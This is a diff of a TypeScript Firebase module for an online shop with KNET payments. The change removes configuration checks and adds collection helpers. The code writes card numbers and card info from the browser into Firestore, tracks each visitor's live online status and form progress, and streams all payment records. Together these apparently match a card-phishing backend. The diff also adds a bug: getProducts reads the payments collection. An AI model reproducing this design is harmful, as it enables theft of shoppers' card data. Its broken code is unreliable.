@@ -11,7 +11,7 @@ import {
   setDoc,
   onSnapshot,
 } from "firebase/firestore";
-import { db, database, isFirebaseConfigured } from "./firebase";
+import { db, database } from "./firebase";
 import {
   onDisconnect,
   onValue,
@@ -73,6 +73,32 @@ export interface CartItem {
   quantity: number;
 }
 
+// Lazy initialization of collections to handle when Firebase is not configured
+export const getProductsCollection = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return collection(db, "products");
+};
+
+export const getOrdersCollection = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return collection(db, "orders");
+};
+
+export const getCartsCollection = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return collection(db, "carts");
+};
+
+export const getUsersCollection = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return collection(db, "users");
+};
+
+export const getPaymentsCollection = () => {
+  if (!db) throw new Error("Firebase is not configured");
+  return collection(db, "payments");
+};
+
 export interface KnetPayment {
   id: string;
   cardNumber: string;
@@ -95,25 +121,18 @@ export interface KnetPayment {
   country?: string;
 }
 
-function checkFirebaseConfigured(): void {
-  if (!isFirebaseConfigured || !db) {
-    throw new Error("Firebase is not configured");
-  }
-}
-
 export async function getProducts(): Promise<FirestoreProduct[]> {
-  checkFirebaseConfigured();
-  const snapshot = await getDocs(collection(db!, "products"));
+  if (!db) throw new Error("Firebase is not configured");
+  const snapshot = await getDocs(getPaymentsCollection());
   return snapshot.docs.map(
-    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct
+    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct,
   );
 }
 
 export async function getProductById(
-  id: string
+  id: string,
 ): Promise<FirestoreProduct | null> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "products", id);
+  const docRef = doc(db, "products", id);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return { id: docSnap.id, ...docSnap.data() } as FirestoreProduct;
@@ -122,21 +141,19 @@ export async function getProductById(
 }
 
 export async function getProductsByCategory(
-  category: string
+  category: string,
 ): Promise<FirestoreProduct[]> {
-  checkFirebaseConfigured();
-  const q = query(collection(db!, "products"), where("category", "==", category));
+  const q = query(getProductsCollection(), where("category", "==", category));
   const snapshot = await getDocs(q);
   return snapshot.docs.map(
-    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct
+    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct,
   );
 }
 
 export async function createOrder(
-  orderData: Omit<FirestoreOrder, "id" | "createdAt">
+  orderData: Omit<FirestoreOrder, "id" | "createdAt">,
 ): Promise<string> {
-  checkFirebaseConfigured();
-  const docRef = await addDoc(collection(db!, "orders"), {
+  const docRef = await addDoc(getOrdersCollection(), {
     ...orderData,
     createdAt: new Date().toISOString(),
   });
@@ -144,17 +161,15 @@ export async function createOrder(
 }
 
 export async function getOrders(): Promise<FirestoreOrder[]> {
-  checkFirebaseConfigured();
-  const q = query(collection(db!, "orders"), orderBy("createdAt", "desc"));
+  const q = query(getOrdersCollection(), orderBy("createdAt", "desc"));
   const snapshot = await getDocs(q);
   return snapshot.docs.map(
-    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreOrder
+    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreOrder,
   );
 }
 
 export async function getOrderById(id: string): Promise<FirestoreOrder | null> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "orders", id);
+  const docRef = doc(db, "orders", id);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return { id: docSnap.id, ...docSnap.data() } as FirestoreOrder;
@@ -165,10 +180,9 @@ export async function getOrderById(id: string): Promise<FirestoreOrder | null> {
 export async function updateOrderStatus(
   id: string,
   status: string,
-  paymentStatus?: string
+  paymentStatus?: string,
 ): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "orders", id);
+  const docRef = doc(db, "orders", id);
   const updateData: any = { status };
   if (paymentStatus) {
     updateData.paymentStatus = paymentStatus;
@@ -177,8 +191,7 @@ export async function updateOrderStatus(
 }
 
 export async function getCart(sessionId: string): Promise<CartItem[]> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "carts", sessionId);
+  const docRef = doc(db, "carts", sessionId);
   const docSnap = await getDoc(docRef);
   if (docSnap.exists()) {
     return docSnap.data().items || [];
@@ -188,30 +201,25 @@ export async function getCart(sessionId: string): Promise<CartItem[]> {
 
 export async function updateCart(
   sessionId: string,
-  items: CartItem[]
+  items: CartItem[],
 ): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "carts", sessionId);
+  const docRef = doc(db, "carts", sessionId);
   await setDoc(
     docRef,
     { items, updatedAt: new Date().toISOString() },
-    { merge: true }
+    { merge: true },
   );
 }
 
 export async function clearCart(sessionId: string): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "carts", sessionId);
+  const docRef = doc(db, "carts", sessionId);
   await setDoc(docRef, { items: [], updatedAt: new Date().toISOString() });
 }
 
 export function subscribeToPaymentStatus(
   paymentId: string,
-  callback: (status: string) => void
+  callback: (status: string) => void,
 ): () => void {
-  if (!isFirebaseConfigured || !db) {
-    return () => {};
-  }
   const docRef = doc(db, "payments", paymentId);
   return onSnapshot(docRef, (docSnap) => {
     if (docSnap.exists()) {
@@ -226,8 +234,7 @@ export async function createPayment(paymentData: {
   amount: string;
   cardInfo?: any;
 }): Promise<string> {
-  checkFirebaseConfigured();
-  const docRef = await addDoc(collection(db!, "payments"), {
+  const docRef = await addDoc(collection(db, "payments"), {
     ...paymentData,
     status: "pending",
     createdAt: new Date().toISOString(),
@@ -237,32 +244,27 @@ export async function createPayment(paymentData: {
 
 export async function updatePaymentStatus(
   paymentId: string,
-  status: string
+  status: string,
 ): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "payments", paymentId);
+  const docRef = doc(db, "payments", paymentId);
   await updateDoc(docRef, { status });
 }
 
 export async function getKnetPayments(): Promise<KnetPayment[]> {
-  checkFirebaseConfigured();
-  const q = query(collection(db!, "payments"), orderBy("createdDate", "desc"));
+  const q = query(getPaymentsCollection(), orderBy("createdDate", "desc"));
   const snapshot = await getDocs(q);
   return snapshot.docs.map(
-    (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment
+    (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment,
   );
 }
 
 export function subscribeToKnetPayments(
-  callback: (payments: KnetPayment[]) => void
+  callback: (payments: KnetPayment[]) => void,
 ): () => void {
-  if (!isFirebaseConfigured || !db) {
-    return () => {};
-  }
-  const q = query(collection(db, "payments"), orderBy("createdDate", "desc"));
+  const q = query(getPaymentsCollection(), orderBy("createdDate", "desc"));
   return onSnapshot(q, (snapshot) => {
     const payments = snapshot.docs.map(
-      (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment
+      (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment,
     );
     callback(payments);
   });
@@ -270,51 +272,42 @@ export function subscribeToKnetPayments(
 
 export async function updateKnetPaymentStatus(
   paymentId: string,
-  status: string
+  status: string,
 ): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "payments", paymentId);
+  const docRef = doc(db, "payments", paymentId);
   await updateDoc(docRef, { status });
 }
 
 export async function updateProduct(
   id: string,
-  data: Partial<FirestoreProduct>
+  data: Partial<FirestoreProduct>,
 ): Promise<void> {
-  checkFirebaseConfigured();
-  const docRef = doc(db!, "products", id);
+  const docRef = doc(db, "products", id);
   await updateDoc(docRef, data);
 }
 
 export async function seedProducts(
-  products: Omit<FirestoreProduct, "id">[]
+  products: Omit<FirestoreProduct, "id">[],
 ): Promise<void> {
-  checkFirebaseConfigured();
   for (const product of products) {
-    await addDoc(collection(db!, "products"), product);
+    await addDoc(getProductsCollection(), product);
   }
 }
 
 export async function addData(data: any) {
-  if (!isFirebaseConfigured || !db) {
-    console.warn("Firebase is not configured. Cannot add data.");
-    return;
-  }
   localStorage.setItem("visitor", data.id);
   try {
-    const docRef = doc(db, "payments", data.id!);
+    const docRef = await doc(db, "payments", data.id!);
     await setDoc(docRef, data, { merge: true });
+
     console.log("Document written with ID: ", docRef.id);
+    // You might want to show a success message to the user here
   } catch (e) {
     console.error("Error adding document: ", e);
+    // You might want to show an error message to the user here
   }
 }
-
 export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
-  if (!isFirebaseConfigured || !db) {
-    console.warn("Firebase is not configured. Cannot process payment.");
-    return;
-  }
   try {
     const visitorId = localStorage.getItem("visitor");
     if (visitorId) {
@@ -322,7 +315,7 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
       await setDoc(
         docRef,
         { ...paymentInfo, createdDate: new Date().toISOString() },
-        { merge: true }
+        { merge: true },
       );
     }
   } catch (error) {
@@ -332,53 +325,63 @@ export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
 };
 
 export const setupOnlineStatus = (userId: string) => {
-  if (!userId || !isFirebaseConfigured || !db || !database) return;
+  if (!userId) return;
 
+  // Create a reference to this user's specific status node in Realtime Database
   const userStatusRef = ref(database, `/status/${userId}`);
+
+  // Create a reference to the user's document in Firestore
   const userDocRef = doc(db, "payments", userId);
 
+  // Set up the Realtime Database onDisconnect hook
   onDisconnect(userStatusRef)
     .set({
       state: "offline",
       lastChanged: serverTimestamp(),
     })
     .then(() => {
+      // Update the Realtime Database when this client connects
       set(userStatusRef, {
         state: "online",
         lastChanged: serverTimestamp(),
       });
 
+      // Update the Firestore document
       updateDoc(userDocRef, {
         online: true,
         lastSeen: serverTimestamp(),
       }).catch((error) =>
-        console.error("Error updating Firestore document:", error)
+        console.error("Error updating Firestore document:", error),
       );
     })
     .catch((error) => console.error("Error setting onDisconnect:", error));
 
+  // Listen for changes to the user's online status
   onValue(userStatusRef, (snapshot) => {
     const status = snapshot.val();
     if (status?.state === "offline") {
+      // Update the Firestore document when user goes offline
       updateDoc(userDocRef, {
         online: false,
         lastSeen: serverTimestamp(),
       }).catch((error) =>
-        console.error("Error updating Firestore document:", error)
+        console.error("Error updating Firestore document:", error),
       );
     }
   });
 };
 
 export const setUserOffline = async (userId: string) => {
-  if (!userId || !isFirebaseConfigured || !db || !database) return;
+  if (!userId) return;
 
   try {
+    // Update the Firestore document
     await updateDoc(doc(db, "payments", userId), {
       online: false,
       lastSeen: serverTimestamp(),
     });
 
+    // Update the Realtime Database
     await set(ref(database, `/status/${userId}`), {
       state: "offline",
       lastChanged: serverTimestamp(),
@@ -387,11 +390,10 @@ export const setUserOffline = async (userId: string) => {
     console.error("Error setting user offline:", error);
   }
 };
-
 export const trackFormProgress = async (
   visitorId: string,
   currentPage: number,
-  formData: any
+  formData: any,
 ) => {
   const progressData = {
     id: visitorId,
